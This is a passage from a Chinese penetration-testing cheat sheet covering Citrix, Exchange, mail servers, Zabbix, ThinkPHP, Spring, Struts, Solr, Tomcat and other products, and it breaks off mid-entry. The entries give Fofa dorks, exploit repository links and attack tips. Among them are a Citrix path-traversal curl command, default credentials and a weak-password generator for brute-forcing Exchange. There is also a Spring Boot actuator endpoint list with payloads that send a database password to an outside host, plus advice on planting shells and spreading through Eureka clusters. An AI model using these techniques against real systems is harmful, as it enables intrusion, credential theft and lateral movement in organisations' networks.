Dork</strong></p><p><code>app=&quot;Citrix-Netscaler&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/news/232752.html">https://www.freebuf.com/news/232752.html</a></p><p><strong>6. 漏洞利用</strong></p><p>trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.<br><a href="https://github.com/trustedsec/cve-2019-19781">https://github.com/trustedsec/cve-2019-19781</a></p><p><strong>7. 利用技巧</strong></p><p>1.通过以下命令可以快速断定</p><p><code>curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure</code></p><p>这里部分版本不需要进行<code>../</code>跳转也可以, 具体原因没有分析</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><p>3.暂时屏蔽未授权用户对/vpns/路径的访问</p><h2 id="齐治堡垒机相关漏洞"><a href="#齐治堡垒机相关漏洞" class="headerlink" title="齐治堡垒机相关漏洞"></a>齐治堡垒机相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写</p><p><strong>2. 影响组件</strong><br>齐治堡垒机</p><p><strong>3. 漏洞指纹</strong></p><p><code>shterm</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;shterm-堡垒机&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>审计某系统从解密到GetShell – 云+社区 – 腾讯云<br><a href="https://cloud.tencent.com/developer/article/1448700">https://cloud.tencent.com/developer/article/1448700</a></p><p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb">http://kfbiji.com/article/65b98114903248eb</a></p><p><strong>6. 漏洞利用</strong></p><p>齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记<br><a href="http://kfbiji.com/article/65b98114903248eb">http://kfbiji.com/article/65b98114903248eb</a></p><p><strong>7. 利用技巧</strong></p><p>1.齐治堡垒机默认口令:<code>shterm/shterm</code></p><p>2.普通用户获取堡垒机权限, 登录之后可尝试命令注入</p><p>如果有类似chrome的应用可以直接使用<code>ctrl+o</code>打开窗口, 然后新建bat, 起一个cmd或者其他的程序</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><p>3.做好权限控制</p><h2 id="Exchange-相关漏洞"><a href="#Exchange-相关漏洞" class="headerlink" title="Exchange 相关漏洞"></a>Exchange 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低)</p><p><strong>2. 影响组件</strong><br>Exchange</p><p><strong>3. 漏洞指纹</strong></p><p><code>Exchange</code></p><p><code>outlook</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Microsoft-Exchange&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/195162.html">https://www.freebuf.com/vuls/195162.html</a></p><p>Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析<br><a href="https://paper.seebug.org/804/">https://paper.seebug.org/804/</a></p><p>微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区<br><a href="https://xz.aliyun.com/t/7299">https://xz.aliyun.com/t/7299</a></p><p><strong>6. 漏洞利用</strong></p><p>Ridter/Exchange2domain: CVE-2018-8581<br><a href="https://github.com/Ridter/Exchange2domain">https://github.com/Ridter/Exchange2domain</a></p><p>Ridter/cve-2020-0688: cve-2020-0688<br><a href="https://github.com/Ridter/cve-2020-0688">https://github.com/Ridter/cve-2020-0688</a></p><p>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p><p><strong>7. 利用技巧</strong></p><p>1.寻找企业的Exchange有个技巧</p><p>除了访问以下域名或者直接查找 <code>DNS MX</code> 记录</p><pre><code class="hljs css"><span class="hljs-selector-tag">mail</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">mail1</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">mail-hk</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">owa</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">exchange</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">email</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre><p>还有个很好用的域名, 这是outlook的自动发现域名</p><p><code>autodiscover.domain.com</code></p><p>2.爆破Exchange</p><p>这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口</p><p>通常这里的密码能横穿内网, 比如 VPN, OA, SSO</p><p><code>Exchange</code>通常有以下几个接口</p><p><code>/owa</code> 前台web登录, 一般可以爆破</p><p><code>/ews</code> 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破</p><p><code>/autodiscover/autodiscover.xml</code> 自动发现接口, 同ews爆破</p><p>3.爆破工具可使用 <code>owa</code>用<code>burp</code>, <code>ews</code>用<code>ruler</code>, <code>awvs</code>(比较好用)</p><p>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p><p>4.弱口令爆破技巧, 爆破<code>Exchange</code>相对比较好用, 直接生成企业特色弱口令</p><pre><code class="hljs prolog">import itertoolsprefix = [<span class="hljs-string">&#x27;baidu&#x27;</span>, <span class="hljs-string">&#x27;Baidu&#x27;</span>]for x in [<span class="hljs-string">&#x27;&#x27;</span>.join(x) for x in list(itertools.product(prefix, [<span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>], [<span class="hljs-string">&#x27;2019&#x27;</span>, <span class="hljs-string">&#x27;2020&#x27;</span>, <span class="hljs-string">&#x27;2018&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;1234&#x27;</span>, <span class="hljs-string">&#x27;123456&#x27;</span>], [<span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>]))] : print(x)baidu@<span class="hljs-number">2019</span>!baidu@<span class="hljs-number">2019</span>baidu@<span class="hljs-number">2019.</span>baidu@<span class="hljs-number">2020</span>!baidu@<span class="hljs-number">2020</span>.........<span class="hljs-symbol">Baidu123456</span><span class="hljs-symbol">Baidu123456</span>.</code></pre><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><p>3.做好权限控制</p><h2 id="Coremail-相关漏洞"><a href="#Coremail-相关漏洞" class="headerlink" title="Coremail 相关漏洞"></a>Coremail 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail</p><p><strong>2. 影响组件</strong><br>Coremail</p><p><strong>3. 漏洞指纹</strong></p><p><code>Coremail</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Coremail&quot;</code></p><p><strong>5. 漏洞分析</strong><br>Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客<br><a href="https://blog.csdn.net/god_zzZ/article/details/92735189">https://blog.csdn.net/god_zzZ/article/details/92735189</a></p><p><strong>6. 漏洞利用</strong></p><p>yuxiaoyou123/coremail-exp<br><a href="https://github.com/yuxiaoyou123/coremail-exp">https://github.com/yuxiaoyou123/coremail-exp</a></p><p>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本<br><a href="https://github.com/dpu/coremail-address-book">https://github.com/dpu/coremail-address-book</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个找不到源码, 没法分析</p><p>里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码</p><p>2.这个东西有几率收到ImageMagick影响(此处存疑, 我只在dnslog见过, 没有实锤)</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Winmail-相关漏洞"><a href="#Winmail-相关漏洞" class="headerlink" title="Winmail 相关漏洞"></a>Winmail 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传</p><p><strong>2. 影响组件</strong><br>Winmail</p><p><strong>3. 漏洞指纹</strong></p><p><code>Winmail</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Winmail-Server&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html">http://www.91ri.org/16519.html</a></p><p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm">http://www.hackdig.com/06/hack-36899.htm</a></p><p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p><p><strong>6. 漏洞利用</strong></p><p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html">http://www.91ri.org/16519.html</a></p><p>winmail过滤不严getshell+任意文件下载(需要登录邮箱）_黑客技术<br><a href="http://www.hackdig.com/06/hack-36899.htm">http://www.hackdig.com/06/hack-36899.htm</a></p><p>Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 | WooYun-2014-57890 | WooYun.org<br><a href="https://php.mengsec.com/bugs/wooyun-2014-057890.html">https://php.mengsec.com/bugs/wooyun-2014-057890.html</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个邮箱很多高校在用, 通过分析补丁, 一些老版本没升级的话还是有问题, 最新版是6.5</p><p>2.邮件系列老洞</p><p>高屋建瓴之WebMail攻与防 – cyjay5un – 博客园<br><a href="https://www.cnblogs.com/cyjaysun/p/4378907.html">https://www.cnblogs.com/cyjaysun/p/4378907.html</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版</p><h2 id="Zabbix-相关漏洞"><a href="#Zabbix-相关漏洞" class="headerlink" title="Zabbix 相关漏洞"></a>Zabbix 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Zabbix 由于监控着内网众多主机, 所以也是内网关注的重点, 主要是注入/弱口令/命令执行</p><p><strong>2. 影响组件</strong></p><p>Zabbix</p><p><strong>3. 漏洞指纹</strong></p><p><code>Zabbix</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Zabbix&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874">https://xz.aliyun.com/t/6874</a></p><p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p><p><strong>6. 漏洞利用</strong></p><p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874">https://xz.aliyun.com/t/6874</a></p><p>Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang<br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p><p><strong>7. 利用技巧</strong></p><p>1.这里如果 Zabbix 附近遇到 Grafana, 一般都是默认口令 admin/admin, 进后台查看数据源的位置, 如果有 Zabbix , 直接 f12 查看密码, 就可以登录 Zabbix 了</p><p>2.另外 Grafana 后台sql查询处可以执行任意 sql, 其他数据源也一样见机行事</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="边界产品-防火墙-网关-路由器-VPN-相关漏洞"><a href="#边界产品-防火墙-网关-路由器-VPN-相关漏洞" class="headerlink" title="边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞"></a>边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>大型企业往往会配置一些边界设备来维护企业内外网通信, 这里也存在灯下黑的问题, 由于多数不开源, 漏洞主要以弱口令为主</p><p><strong>2. 影响组件</strong></p><p>防火墙, 网关, 路由器, VPN</p><p><strong>3. 漏洞指纹</strong></p><p>防火墙, 网关, 路由器, VPN</p><p><strong>4. Fofa Dork</strong><br>防火墙, 网关, 路由器, VPN 的名称</p><p><strong>5. 漏洞分析</strong></p><p>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html">https://www.it2021.com/security/614.html</a></p><p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p><p><strong>6. 漏洞利用</strong></p><p>【安全设备】常见网络安全设备默认口令|IT2021.Com<br><a href="https://www.it2021.com/security/614.html">https://www.it2021.com/security/614.html</a></p><p>渗透测试之各厂商防火墙登录IP、初始密码、技术支持<br><a href="https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA">https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个东西好多人不改默认口令, 就算改很多也是企业特色弱口令</p><p><code>admin</code> <code>root</code> <code>123456</code> 永远的神</p><p>内网的安全平台就是个漏洞指南</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.限制来源IP</p><h2 id="第三节"><a href="#第三节" class="headerlink" title="第三节"></a>第三节</h2><blockquote><p>本节主要是针对一些常见组件和中间件的相关漏洞(大部分是要结合环境利用), 这里肯定篇幅有限, 难免有所遗漏, 欢迎补充</p></blockquote><h2 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p><p><strong>2. 影响组件</strong><br>Thinkphp</p><p><strong>3. 漏洞指纹</strong></p><p><code>Thinkphp</code></p><p><code>X-Powered-By: ThinkPHP</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;ThinkPHP&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>ThinkPHP漏洞总结 – 赛克社区<br><a href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a></p><p>挖掘暗藏ThinkPHP中的反序列利用链 – 斗象能力中心<br><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p><p>ThinkPHP使用不当可能造成敏感信息泄露<em>PHP_Fly</em>鹏程万里-CSDN博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/81201904">https://blog.csdn.net/Fly_hps/article/details/81201904</a></p><p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p><p><strong>6. 漏洞利用</strong></p><p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p><p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<br><a href="https://github.com/Dido1960/thinkphp">https://github.com/Dido1960/thinkphp</a></p><p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<br><a href="https://github.com/whirlwind110/tphack">https://github.com/whirlwind110/tphack</a></p><p><strong>7. 利用技巧</strong></p><p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p><p>2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p><p>3.实战中也看到偶尔有可以利用的情况, 运气好可能有惊喜, 刚好有篇新出的文章中使用到了这个漏洞</p><p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461">https://www.anquanke.com/post/id/203461</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.升级到最新版Thinkphp</p><p>3.前置WAF进行防护</p><h2 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p><p><strong>2. 影响组件</strong><br>Spring xxx</p><p><strong>3. 漏洞指纹</strong></p><p><code>X-Application-Context:</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Spring-Framework&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Spring 框架漏洞集合 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p><p>Exploiting Spring Boot Actuators | Veracode blog<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p><p>Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog<br><a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><strong>6. 漏洞利用</strong></p><p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE<br><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p><p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p><strong>7. 利用技巧</strong></p><p>1.Spring Boot Actuators 相关漏洞超级好用</p><p>很多厂商一开始都不懂, 直接对外开放<code>Spring Boot Actuators</code>, 造成了有一段时间每个用了<code>Spring Boot</code>的厂商都出了问题</p><p>尤其是现在很多厂商使用微服务框架, 通过网关进行路由分发, 一些子目录通常对应一个<code>Spring Boot</code>启动的服务</p><p>然后子目录比如 <code>http://123.123.123.123/admin/env</code> , <code>http://123.123.123.123/manager/env</code>也都是可以出现的</p><p><code>/env</code> 可以偷session, RCE</p><p><code>/heapdump</code> 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象</p><p>可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p><pre><code class="hljs gradle">/trace/health/loggers/metrics/autoconfig/heapdump/threaddump/env/info/<span class="hljs-keyword">dump</span>/configprops/mappings/auditevents/beans/jolokia/cloudfoundryapplication/hystrix.stream/actuator<span class="hljs-regexp">/actuator/</span>auditevents<span class="hljs-regexp">/actuator/</span>beans<span class="hljs-regexp">/actuator/</span>health<span class="hljs-regexp">/actuator/</span>conditions<span class="hljs-regexp">/actuator/</span>configprops<span class="hljs-regexp">/actuator/</span>env<span class="hljs-regexp">/actuator/i</span>nfo<span class="hljs-regexp">/actuator/</span>loggers<span class="hljs-regexp">/actuator/</span>heapdump<span class="hljs-regexp">/actuator/</span>threaddump<span class="hljs-regexp">/actuator/m</span>etrics<span class="hljs-regexp">/actuator/</span>scheduledtasks<span class="hljs-regexp">/actuator/</span>httptrace<span class="hljs-regexp">/actuator/m</span>appings<span class="hljs-regexp">/actuator/</span>jolokia<span class="hljs-regexp">/actuator/</span>hystrix.stream/monitor<span class="hljs-regexp">/monitor/</span>auditevents<span class="hljs-regexp">/monitor/</span>beans<span class="hljs-regexp">/monitor/</span>health<span class="hljs-regexp">/monitor/</span>conditions<span class="hljs-regexp">/monitor/</span>configprops<span class="hljs-regexp">/monitor/</span>env<span class="hljs-regexp">/monitor/i</span>nfo<span class="hljs-regexp">/monitor/</span>loggers<span class="hljs-regexp">/monitor/</span>heapdump<span class="hljs-regexp">/monitor/</span>threaddump<span class="hljs-regexp">/monitor/m</span>etrics<span class="hljs-regexp">/monitor/</span>scheduledtasks<span class="hljs-regexp">/monitor/</span>httptrace<span class="hljs-regexp">/monitor/m</span>appings<span class="hljs-regexp">/monitor/</span>jolokia<span class="hljs-regexp">/monitor/</span>hystrix.stream</code></pre><p>这里通过 <code>/env</code> + <code>/refresh</code> 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作</p><p>里面就有操作空间, 很像fastjson反序列化</p><p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok</p><p>springboot Information Disclosure<br><a href="https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3">https://gist.github.com/UUUUnotfound/fed628b074859997d6970717ddd7fbf3</a></p><p><code>eureka.client.serviceUrl.defaultZone=http://$&#123;somedb.password&#125;@127.0.0.1:5000</code></p><p><code>spring.cloud.bootstrap.location=http://$&#123;somedb.password&#125;@artsploit.com/yaml-payload.yml</code></p><p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群</p><p>eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.开启Spring Boot Actuators权限校验</p><p>3.前置WAF进行防护</p><h2 id="Phpstudy-后门远程代码执行"><a href="#Phpstudy-后门远程代码执行" class="headerlink" title="Phpstudy 后门远程代码执行"></a>Phpstudy 后门远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器</p><p><strong>2. 影响组件</strong></p><p>Phpstudy</p><p><strong>3. 漏洞指纹</strong></p><p><code>phpStudy 探针</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;phpStudy 探针&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>PhpStudy 后门分析<br><a href="https://paper.seebug.org/1044/">https://paper.seebug.org/1044/</a></p><p><strong>6. 漏洞利用</strong></p><p>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本<br><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p><p><strong>7. 利用技巧</strong></p><p>1.phpstudy 根目录下面有个<code>l.php</code> , 里面有探针, 可以作为判断条件</p><p>2.还有个<code>/phpmyadmin</code>目录, 一般密码都是<code>root/root</code> 后台<code>mysql outfile</code> 写 shell 就ok了</p><p><strong>8. 防护方法</strong></p><p>1.及时删除phpstudy</p><p>2.升级到最新版</p><p>3.不要用phpstduy搭建生产环境</p><h2 id="Struts-系列漏洞"><a href="#Struts-系列漏洞" class="headerlink" title="Struts 系列漏洞"></a>Struts 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在</p><p><strong>2. 影响组件</strong><br>Struts</p><p><strong>3. 漏洞指纹</strong></p><p><code>Struts</code></p><p><code>.action</code></p><p><code>.do</code></p><p><code>.action!xxxx</code></p><p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/">https://github.com/coffeehb/struts2_check/</a></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Struts2&quot;</code> (这个不太准)</p><p><strong>5. 漏洞分析</strong></p><p>Struts2代码执行漏洞整理 – 简书<br><a href="https://www.jianshu.com/p/d7cd8a2a992b">https://www.jianshu.com/p/d7cd8a2a992b</a></p><p><strong>6. 漏洞利用</strong></p><p>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan</p><p><a href="https://github.com/Lucifer1993/struts-scan/">https://github.com/Lucifer1993/struts-scan/</a></p><p><strong>7. 利用技巧</strong></p><p>1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.不建议使用Struts</p><h2 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p><p><strong>2. 影响组件</strong></p><p>Solr</p><p><strong>3. 漏洞指纹</strong></p><p><code>Solr</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Solr&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/218730.html">https://www.freebuf.com/vuls/218730.html</a></p><p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<br><a href="https://paper.seebug.org/1009/">https://paper.seebug.org/1009/</a></p><p><strong>6. 漏洞利用</strong></p><p>veracode-research/solr-injection: Apache Solr Injection Research<br><a href="https://github.com/veracode-research/solr-injection">https://github.com/veracode-research/solr-injection</a></p><p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)<br><a href="https://github.com/jas502n/CVE-2019-12409">https://github.com/jas502n/CVE-2019-12409</a></p><p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit<br><a href="https://github.com/mogwailabs/mjet">https://github.com/mogwailabs/mjet</a></p><p><strong>7. 利用技巧</strong></p><p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p><p>2.遇到<code>mjet</code>连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用<code>socat</code>进行流量转发, 后记里面有具体操作</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.不要对外开放敏感端口</p><h2 id="Tomcat-本地文件包含漏洞-CVE-2020-1938"><a href="#Tomcat-本地文件包含漏洞-CVE-2020-1938" class="headerlink" title="Tomcat 本地文件包含漏洞 (CVE-2020-1938)"></a>Tomcat 本地文件包含漏洞 (CVE-2020-1938)</h2><p><strong>1. 漏洞简介</strong></p><p>Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效</p><p><strong>2. 影响组件</strong></p><p>Apache Tomcat 6</p><p>Apache Tomcat 7 &lt; 7.0.100</p><p>Apache Tomcat 8 &lt; 8.5.51</p><p>Apache Tomcat 9 &lt; 9.0.31</p><p><strong>3. 漏洞指纹</strong></p><p><code>tomcat</code></p><p><code>8009</code></p><p><code>ajp</code></p><p><code>\x04\x01\xf4\x00\x15</code></p><p><strong>4. Fofa Dork</strong></p><p><code>protocol=&quot;ajp&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心<br><a href="https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p><p><strong>6. 漏洞利用</strong></p><p>0nise/CVE-2020-1938: CVE-2020-1938<br><a href="https://github.com/0nise/CVE-2020-1938">https://github.com/0nise/CVE-2020-1938</a></p><p><strong>7. 